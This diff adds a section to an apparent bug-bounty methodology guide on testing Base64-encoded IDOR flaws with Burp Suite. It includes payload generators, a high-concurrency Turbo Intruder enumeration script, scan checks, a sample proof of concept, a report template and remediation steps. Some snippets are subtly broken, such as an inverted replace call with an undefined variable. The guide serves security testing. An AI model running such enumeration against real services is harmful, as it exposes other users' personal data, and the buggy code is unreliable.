@@ -7269,3 +7269,643 @@ Data breach risk
 
 ---
 
+# 🔍 **Bug #14: Base64 Encoded IDOR - Complete Burp Suite Methodology**
+
+## 📌 **Bug Description**
+**IDOR vulnerability where object references are encoded in Base64** (e.g., `id=MTIz` where MTIz = "123"). This encoding provides false sense of security but is easily reversible.
+
+---
+
+## 🎯 **Target Pattern Examples**
+```http
+GET /api/user/MTIz           # Base64 of "123"
+GET /profile?id=NDU2          # Base64 of "456"
+POST /api/data MTAwCg==       # Base64 of "100\n"
+Cookie: user=am9obg==         # Base64 of "john"
+```
+
+---
+
+## 📊 **PHASE 1: RECONNAISSANCE & IDENTIFICATION**
+
+### **Step 1: Configure Burp Suite**
+
+1. **Set up Target Scope**
+```
+1. Open Burp → Target → Scope
+2. Add target domain (e.g., *.example.com)
+3. Check "Use advanced scope control"
+4. Include: ^https?://.*\.example\.com/.*
+```
+
+2. **Configure Proxy**
+```
+1. Proxy → Options → Proxy Listeners
+2. Ensure intercept is on
+3. Set up FoxyProxy/ browser proxy
+```
+
+3. **Load Extensions** (Extender → BApp Store)
+```
+- Base64 Decoder (for automatic detection)
+- Hackvertor (for encoding/decoding)
+- Turbo Intruder (for faster attacks)
+- Custom Parameter Handler
+```
+
+---
+
+### **Step 2: Spider the Application**
+
+```
+1. Target → Site map → Right-click domain
+2. Select "Spider this host"
+3. Configure spider:
+   - Check "Don't stop spider"
+   - Max links: 1000
+   - Max depth: 5
+4. Start spidering
+```
+
+### **Step 3: Passive Scan for Base64 Patterns**
+
+**Create Passive Scan Check:**
+```python
+# Extender → Extensions → Add (Python)
+def doPassiveScan(basePairResponse, insertedScanCheck):
+    # Check for Base64 patterns in requests
+    request = basePairResponse.getRequest()
+    if b"eyJ" in request or b"==" in request:
+        # Looks like Base64, flag for manual review
+        return [ScanIssue(...)]
+```
+
+---
+
+## 🔍 **PHASE 2: MANUAL DETECTION TECHNIQUES**
+
+### **Step 4: Manual Parameter Inspection**
+
+**Method A: Proxy History Review**
+```
+1. Proxy → HTTP History
+2. Filter by MIME type: all
+3. Search parameters containing:
+   - "id="
+   - "user="
+   - "file="
+   - "doc="
+   - "ref="
+4. Look for strings ending with "=" or "=="
+```
+
+**Method B: Engagement Tools**
+```
+1. Right-click interesting request
+2. Engagement tools → Find references
+3. Check all parameters
+4. Use "Discover content" for hidden endpoints
+```
+
+### **Step 5: Base64 Detection Script**
+
+**Create Intruder Payload for Detection:**
+```python
+# Payload to identify Base64 parameters
+def detect_base64_parameters(request):
+    import re
+    import base64
+    
+    # Regex for potential Base64
+    b64_pattern = r'[A-Za-z0-9+/]{4,}={0,2}'
+    
+    params = extract_parameters(request)
+    for param in params:
+        if re.match(b64_pattern, param):
+            try:
+                decoded = base64.b64decode(param)
+                print(f"Found Base64: {param} -> {decoded}")
+                return True
+            except:
+                pass
+    return False
+```
+
+---
+
+## 🎯 **PHASE 3: ACTIVE TESTING**
+
+### **Step 6: Burp Intruder Attack Setup**
+
+**Create Custom Attack:**
+```
+1. Send request to Intruder (Ctrl+I)
+2. Positions tab → Clear §
+3. Highlight Base64 value → Add §
+4. Select Attack type: Sniper
+```
+
+**Payload Generation Rules:**
+
+```python
+# Custom Payload Generator for Base64 IDOR
+def generate_payloads(base_value):
+    payloads = []
+    
+    # Original encoded value
+    original = base64.b64encode(str(base_value).encode()).decode()
+    payloads.append(original)
+    
+    # Sequential IDs
+    for i in range(base_value-20, base_value+21):
+        if i > 0:
+            encoded = base64.b64encode(str(i).encode()).decode()
+            payloads.append(encoded)
+    
+    # Common IDs
+    common_ids = [1, 100, 500, 999, 1000, 5000]
+    for id in common_ids:
+        payloads.append(base64.b64encode(str(id).encode()).decode())
+    
+    # Edge cases
+    edge_cases = ['0', '-1', '999999999', 'admin', 'root']
+    for case in edge_cases:
+        payloads.append(base64.b64encode(case.encode()).decode())
+    
+    return list(set(payloads))  # Remove duplicates
+```
+
+### **Step 7: Configure Intruder Payloads**
+
+```
+1. Payloads tab → Payload type: "Custom iterator"
+2. Add processing rules:
+   - Add: Base64-encode
+   - Add: URL-encode (if needed)
+   
+3. Payload Options:
+   - Start with [1-1000] range
+   - Add common usernames
+   - Add system IDs
+```
+
+### **Step 8: Advanced Fuzzing with Turbo Intruder**
+
+```python
+# Turbo Intruder script for Base64 IDOR
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=30,
+                          requestsPerConnection=100,
+                          pipeline=False)
+    
+    # Generate Base64 variations
+    for i in range(1, 1001):
+        # Original number
+        b64_encoded = base64.b64encode(str(i).encode()).decode()
+        engine.queue(target.req.replace(b64_encoded, original_value))
+        
+        # Different encodings
+        variations = [
+            base64.b64encode(str(i).encode()).decode(),
+            base64.b64encode(str(i).encode()).decode().rstrip('='),
+            base64.b64encode(('0' + str(i)).encode()).decode(),
+            base64.b64encode(('00' + str(i)).encode()).decode()
+        ]
+        
+        for var in variations:
+            engine.queue(target.req.replace(original_value, var))
+
+def handleResponse(req, interesting):
+    if '200 OK' in req.response:
+        table.add(req)
+```
+
+---
+
+## 🔬 **PHASE 4: DECODING & ANALYSIS**
+
+### **Step 9: Burp Decoder Usage**
+
+```
+1. Select Base64 parameter
+2. Send to Decoder (Ctrl+D)
+3. Choose "Decode as" → Base64
+4. Check decoded value pattern:
+   - Is it numeric?
+   - Is it a username?
+   - Is it a file path?
+   - Is it UUID/GUID?
+```
+
+### **Step 10: Custom Decoder Script**
+
+```python
+# Python script for Burp Extender
+from burp import IBurpExtender, IContextMenuFactory
+from javax.swing import JMenuItem
+import base64
+
+class BurpExtender(IBurpExtender, IContextMenuFactory):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("Base64 IDOR Helper")
+        callbacks.registerContextMenuFactory(self)
+        
+    def createMenuItems(self, invocation):
+        menu = []
+        menu.append(JMenuItem("Decode Base64 IDOR", 
+                   actionPerformed=lambda x: self.decode_idor(invocation)))
+        return menu
+    
+    def decode_idor(self, invocation):
+        messages = invocation.getSelectedMessages()
+        for message in messages:
+            request = message.getRequest()
+            analyzed = self._helpers.analyzeRequest(request)
+            parameters = analyzed.getParameters()
+            
+            for param in parameters:
+                value = param.getValue()
+                try:
+                    decoded = base64.b64decode(value)
+                    print(f"Parameter: {param.getName()}")
+                    print(f"Encoded: {value}")
+                    print(f"Decoded: {decoded}")
+                    print("-" * 40)
+                except:
+                    pass
+```
+
+---
+
+## 🎨 **PHASE 5: EXPLOITATION**
+
+### **Step 11: Crafting Exploit Payloads**
+
+**Generate Exploit Wordlist:**
+```bash
+#!/bin/bash
+# Generate Base64 encoded numeric IDs
+
+for i in {1..1000}; do
+    # Standard Base64
+    echo -n $i | base64
+    
+    # Without padding
+    echo -n $i | base64 | tr -d '='
+    
+    # URL-safe Base64
+    echo -n $i | base64 | tr '+/' '-_' | tr -d '='
+    
+    # With newline
+    echo $i | base64
+done > b64_ids.txt
+```
+
+### **Step 12: Burp Repeater Testing**
+
+```
+1. Find interesting parameter in Proxy history
+2. Right-click → Send to Repeater (Ctrl+R)
+3. Modify Base64 value:
+   Original: id=MTIz      # "123"
+   Modified: id=MTI0      # "124"
+   
+4. Check response differences:
+   - 200 OK vs 403/404
+   - Content length
+   - Response data (other user's info)
+   - Error messages
+```
+
+### **Step 13: Automated Testing with Scanner**
+
+**Create Active Scan Check:**
+```python
+def doActiveScan(baseRequestResponse, insertionPoint):
+    # Get original value
+    original = insertionPoint.getBaseValue()
+    
+    try:
+        # Decode original
+        decoded = base64.b64decode(original)
+        
+        # Try variations
+        checks = [
+            (int(decoded) + 1),
+            (int(decoded) - 1),
+            0,
+            999999
+        ]
+        
+        for check in checks:
+            encoded = base64.b64encode(str(check).encode())
+            checkRequest = insertionPoint.buildRequest(encoded)
+            
+            # Send request
+            response = self._callbacks.makeHttpRequest(
+                baseRequestResponse.getHttpService(), checkRequest)
+            
+            # Analyze response
+            if self.isInteresting(response):
+                return [ScanIssue(...)]
+                
+    except:
+        pass
+```
+
+---
+
+## 📊 **PHASE 6: RESPONSE ANALYSIS**
+
+### **Step 14: Comparison Techniques**
+
+**Using Comparer Tool:**
+```
+1. Select two similar requests
+2. Right-click → Send to Comparer (Ctrl+C)
+3. Compare responses:
+   - Words/request
+   - Response times
+   - Status codes
+   - Content length
+```
+
+**Response Analysis Script:**
+```python
+def analyze_response(response):
+    indicators = {
+        'success': ['200 OK', '{"status":"success"'],
+        'error': ['403 Forbidden', '404 Not Found', 'access denied'],
+        'leak': ['email', 'password', 'ssn', 'credit card'],
+        'redirect': ['302', 'Location:']
+    }
+    
+    score = 0
+    for category, patterns in indicators.items():
+        for pattern in patterns:
+            if pattern in response:
+                if category == 'success':
+                    score += 10
+                elif category == 'leak':
+                    score += 50
+                    
+    return score
+```
+
+---
+
+## 🔧 **PHASE 7: ADVANCED TECHNIQUES**
+
+### **Step 15: Multi-layer Encoding**
+
+```python
+# Test for double encoding
+def test_double_encoding(original_value):
+    exploits = []
+    
+    # Original number
+    num = 123
+    
+    # Single Base64
+    single = base64.b64encode(str(num).encode())
+    
+    # Double Base64
+    double = base64.b64encode(single)
+    
+    # URL encode then Base64
+    url_encoded = urllib.parse.quote(str(num))
+    b64_url = base64.b64encode(url_encoded.encode())
+    
+    # Base64 then URL encode
+    b64_first = base64.b64encode(str(num).encode())
+    final = urllib.parse.quote(b64_first)
+    
+    return [single, double, b64_url, final]
+```
+
+### **Step 16: Encoding Variations Script**
+
+```python
+# Comprehensive encoding fuzzer
+class Base64Fuzzer:
+    def __init__(self, original_value):
+        self.original = original_value
+        
+    def generate_variations(self):
+        variations = []
+        numbers = [int(self.original), 
+                  int(self.original)+1, 
+                  int(self.original)-1,
+                  1, 0, 999999]
+        
+        for num in numbers:
+            # Standard Base64
+            std = base64.b64encode(str(num).encode())
+            variations.append(std)
+            
+            # URL-safe Base64
+            url_safe = base64.urlsafe_b64encode(str(num).encode())
+            variations.append(url_safe)
+            
+            # Without padding
+            no_pad = std.decode().rstrip('=')
+            variations.append(no_pad.encode())
+            
+            # With multiple padding
+            multi_pad = std + b'==='
+            variations.append(multi_pad)
+            
+            # Different encodings of same number
+            for fmt in ['{:d}', '{:04d}', '{:x}']:
+                formatted = fmt.format(num).encode()
+                variations.append(base64.b64encode(formatted))
+                
+        return list(set(variations))
+```
+
+---
+
+## 📈 **PHASE 8: EXPLOITATION VALIDATION**
+
+### **Step 17: Confirming the Vulnerability**
+
+**Checklist for Confirmation:**
+```
+□ Can access another user's data
+□ Received 200 OK with sensitive info
+□ Response contains personal data (name, email, etc.)
+□ Can modify another user's data
+□ No CSRF/other protections bypassed
+□ Consistent across multiple IDs
+□ Works with different encoding variations
+```
+
+### **Step 18: Impact Assessment**
+
+```python
+def assess_impact(successful_exploit):
+    impact_score = 0
+    findings = []
+    
+    # Check data sensitivity
+    if 'password' in response:
+        impact_score += 10
+        findings.append("Password exposure")
+    
+    if 'credit' in response or 'card' in response:
+        impact_score += 20
+        findings.append("Financial data exposure")
+    
+    if 'admin' in response or 'root' in response:
+        impact_score += 15
+        findings.append("Privileged account access")
+    
+    # Check write access
+    if method in ['POST', 'PUT', 'DELETE']:
+        impact_score += 5
+        findings.append("Data modification possible")
+    
+    return {
+        'score': impact_score,
+        'findings': findings,
+        'severity': 'Critical' if impact_score > 30 else 'High' if impact_score > 20 else 'Medium'
+    }
+```
+
+---
+
+## 📝 **PHASE 9: REPORTING**
+
+### **Step 19: Generate Proof of Concept**
+
+**Create POC Request/Response:**
+```
+=== VULNERABLE ENDPOINT ===
+GET /api/user/MTI0 HTTP/1.1        # 124 in Base64
+Host: example.com
+Cookie: session=valid_session
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "id": 124,
+  "email": "victim@example.com",
+  "name": "Victim User",
+  "ssn": "123-45-6789",
+  "credit_card": "4111-1111-1111-1111"
+}
+
+=== COMPARISON ===
+Original (ID 123): 200 OK, own data
+Modified (ID 124): 200 OK, victim's data
+```
+
+### **Step 20: Documentation Template**
+
+```markdown
+# IDOR Vulnerability Report: Base64 Encoded Parameters
+
+## Vulnerability Type
+Insecure Direct Object Reference (IDOR) via Base64 encoding
+
+## Endpoint
+`GET /api/user/{base64_id}`
+
+## Description
+The application uses Base64-encoded numeric IDs to reference user objects. 
+These can be easily decoded and manipulated to access other users' data.
+
+## Steps to Reproduce
+1. Login as user "test"
+2. GET /api/user/MTAw (Base64 of "100")
+3. Decode to see your own data
+4. Modify to MTI0 (Base64 of "124")
+5. Observe victim's data in response
+
+## Impact
+- Unauthorized access to all user data
+- PII exposure
+- Potential account takeover
+- Data breach risk
+
+## CVSS Score
+Base Score: 8.2 (High)
+Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N
+
+## Remediation
+- Implement proper access controls
+- Use indirect reference maps
+- Add authorization checks
+- Consider using UUIDs instead
+- Rate limit API endpoints
+```
+
+---
+
+## 🛡️ **PHASE 10: MITIGATION TESTING**
+
+### **Step 21: Verify Fix**
+
+```python
+def test_mitigation(endpoint, payloads):
+    results = []
+    
+    for payload in payloads:
+        response = send_request(endpoint.replace('{id}', payload))
+        
+        if response.status_code == 200:
+            # Check if data belongs to current user
+            if is_authorized_user(response):
+                results.append({'payload': payload, 'status': 'secure'})
+            else:
+                results.append({'payload': payload, 'status': 'vulnerable'})
+        elif response.status_code in [403, 401, 404]:
+            results.append({'payload': payload, 'status': 'blocked'})
+            
+    return results
+```
+
+---
+
+## 🎯 **PRO TIPS**
+
+### **Burp Shortcuts for IDOR Testing**
+- `Ctrl+R`: Send to Repeater
+- `Ctrl+I`: Send to Intruder
+- `Ctrl+D`: Send to Decoder
+- `Ctrl+C`: Send to Comparer
+- `Ctrl+F`: Search in responses
+- `Ctrl+Shift+F`: Filter history
+
+### **Common Base64 Patterns**
+- Numeric: `MTIz` (123)
+- Email: `dXNlckBleGFtcGxlLmNvbQ==` (user@example.com)
+- UUID: `ZjU2YzY3YjgtYzM4NC00...`
+- Path: `L2hvbWUvdXNlci9maWxlLnR4dA==` (/home/user/file.txt)
+- JSON: `eyJpZCI6MTIzLCJuYW1lIjoidGVzdCJ9`
+
+### **Automation Scripts**
+```bash
+# Quick Base64 decode loop
+while read line; do
+    echo "$line -> $(echo -n "$line" | base64 -d 2>/dev/null)"
+done < b64_params.txt
+
+# Burp Suite automation with BChecks
+bcheck run --file idor_base64.bcheck --target https://example.com
+```
+
+---
+
+## 📚 **RESOURCES**
+
+- **Burp Extensions**: Base64 Decoder, Hackvertor, Turbo Intruder
+- **Wordlists**: SecLists/Discovery/Web-Content/burp-parameter-names.txt
+- **Practice Labs**: PortSwigger IDOR labs, PentesterLab Base64 challenges
+
+---
+
